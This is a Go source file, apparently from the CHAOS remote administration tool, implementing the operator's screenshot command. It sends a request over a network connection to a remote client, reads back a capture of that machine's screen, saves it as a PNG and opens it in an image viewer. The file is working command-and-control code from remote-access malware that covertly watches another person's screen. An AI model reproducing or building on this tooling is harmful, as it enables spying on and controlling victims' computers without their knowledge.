package screenshot

import (
	"fmt"
	"github.com/google/uuid"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/util/network"
	"github.com/tiagorlampert/CHAOS/pkg/color"
	"github.com/tiagorlampert/CHAOS/pkg/system"
	"github.com/tiagorlampert/CHAOS/pkg/util"
	"net"
)

type ScreenshotUseCase struct {
	Connection net.Conn
}

func NewScreenshotUseCase(conn net.Conn) usecase.Screenshot {
	return &ScreenshotUseCase{
		Connection: conn,
	}
}

func (s ScreenshotUseCase) TakeScreenshot(input string) {
	fmt.Println(color.Green, "[*] Getting Screenshot...")
	err := network.Send(s.Connection, []byte(input))
	if err != nil {
		log.WithField("cause", err.Error()).Error("error sending request")
		return
	}

	data, err := network.Read(s.Connection)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading screenshot")
		return
	}

	if err := saveScreenshot(data); err != nil {
		log.WithField("cause", err.Error()).Error("error saving screenshot")
	}
}

func saveScreenshot(response []byte) error {
	util.CreateDirectory(util.TempDirectory)

	filename := fmt.Sprint(util.TempDirectory, uuid.New().String(), ".png")
	if err := util.WriteFile(filename, response); err != nil {
		return err
	}

	fmt.Println(color.Green, "[*] File saved at", filename)
	system.RunCmd(fmt.Sprintf("eog %s", filename), 5)
	return nil
}
